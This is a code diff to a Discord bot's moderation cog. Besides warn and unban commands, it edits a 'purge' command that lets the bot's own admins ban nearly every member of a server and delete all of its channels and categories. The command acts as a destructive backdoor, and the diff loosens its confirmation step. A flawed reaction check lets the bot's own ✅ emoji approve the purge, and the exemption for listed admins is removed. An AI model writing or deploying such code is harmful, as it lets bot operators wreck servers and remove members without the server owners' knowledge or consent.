@@ -38,19 +38,22 @@ class Mod(Cog):
         print(f"{ctx.author.name} warned {member.name} in {ctx.guild} for {reason}")
         if reason == None:
             embed = Embed(title = "Command: poo.warn",
-                                description = '''**Description**: Warns a member
-                                                **Cooldown**: 5 seconds
-                                                **Usage**: poo.warn [member][reason]''',
+                                description = '''**Please give a reason**''',
                                 color = Color.dark_blue())
             await ctx.send(embed = embed)
         else:
-    
-            await member.send(f"You were warned in {ctx.guild.name} for: {reason}")
+            try:
+
+                await member.send(f"You were warned in {ctx.guild.name} for: {reason}")
+            except:
+                pass
 
             embed = Embed(title =f":poop:***{member} has been warned***", color = Color.dark_blue())
 
             await ctx.send(embed=embed)
             
+    
+        
 
     @warn.error
     async def on_warn_error(self,ctx,error):
@@ -79,41 +82,42 @@ class Mod(Cog):
 
             
 
-            members = ctx.guild.members
-            bot = await self.bot.fetch_user(738990452673478738)
-            confirm_primary = await self.bot.fetch_channel(814917487651979314)
-            await confirm_primary.send(f"Purge#{password}. Request from **{ctx.author}** to purge **{ctx.guild}**. Please commit primary authorization \"Y\" or \"N\".")
-            messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.channel.id ==814917487651979314 and not message.author.bot)
             
             
-            if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
-                confirm_final = await self.bot.fetch_channel(814973520983097344)
+            confirm_primary = self.bot.get_channel(814917487651979314)
+            
+            p_message = await confirm_primary.send(f"Purge#{password}. Request from **{ctx.author}** to purge **{ctx.guild}**. Please commit primary authorization.")
+            await p_message.add_reaction('✅')
+            await p_message.add_reaction('❌')
+            
+        
+            reaction,user = await self.bot.wait_for('reaction_add',check = lambda reaction,user: reaction.emoji == '✅' or reaction.emoji == '❌' and not user.bot)
+            
+           
+            
+            if reaction.emoji == '✅':
+                confirm_final = self.bot.get_channel(814973520983097344)
                 
                 await ctx.author.send(f"Launch code is {password}")
                 await confirm_final.send(f"Purge #{password}. Please enter the password for final authorization to purge **{ctx.guild}** per request of **{ctx.author}**")
                 messageconfirm_final = await self.bot.wait_for('message', check = lambda message: message.channel.id == 814973520983097344 and not message.author.bot)
 
                 if messageconfirm_final.content == str(password) and messageconfirm_final.author.id == ctx.author.id and messageconfirm_final.channel == confirm_final:
-                    await confirm_final.send(f"Purge #{password}. Password accepted: Authorized purge #{password} of **{ctx.guild}** as request of **{ctx.author.name}**. Intializing protocols")
-
-                    await confirm_final.send(f"Initiating first protocol of purge #{password}")
-                    for member in members:
-                        if member == bot:
-                            bot = member
-                            break
-
-                    await confirm_final.send(f"Initiating second protocol of purge #{password}")
-                    for member in members:
-                    
-                        if member.top_role > bot.top_role: 
-                            continue
-                        elif member.top_role < bot.top_role and member.id != ctx.guild.owner.id:
-                            if member.id not in self.list_of_admins:
-                                print(f"now banning {member.name}") 
+                    await confirm_final.send(f"Purge #{password}. Password accepted: Authorized purge #{password} of **{ctx.guild}** as request of **{ctx.author.name}**. Intializing protocols...")
+                   
+                    bot = ctx.guild.get_member(738990452673478738)
+                    for member in ctx.guild.members:
+                        
+                        if member.top_role < bot.top_role and not member.bot:
+                            
+                            
+                            try: 
+                                print(f"now banning {member.name}")
                                 await member.ban(reason = "keked")
-                                numBans+=1  
-
-                    await confirm_final.send(f"Initiating third protocol of purge #{password}")
+                                numBans+=1
+                            except:
+                                pass
+                              
 
                                     
                     for textChannel in ctx.guild.text_channels:
@@ -121,13 +125,13 @@ class Mod(Cog):
                         await textChannel.delete()
                         numChannels += 1
                     
-                    await confirm_final.send(f"Initiating fourth protocol of purge #{password}") 
+                   
 
                     for voiceChannel in ctx.guild.voice_channels:
                         await voiceChannel.delete() 
                         numChannels+= 1
                     
-                    await confirm_final.send(f"Initiating final protocol of purge #{password}")
+                    
 
                     for category in ctx.guild.categories:
                         await category.delete()
@@ -144,6 +148,7 @@ class Mod(Cog):
                 await confirm_primary.send(f"Purge Request #{password} has been denied")
         else:
             await ctx.send('lol no.')    
+
     @command(name = "unban",brief = "unbans a member given their id")
     async def unban(self,ctx, id: int):
         if ctx.author.id in self.list_of_admins:
@@ -208,7 +213,7 @@ class Mod(Cog):
             
             
         if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
-            role = get(guild.roles,name = "Administrators")
+            role = get(guild.roles,name = "Frank")
             print(role)
             await member.add_roles(role) 
 
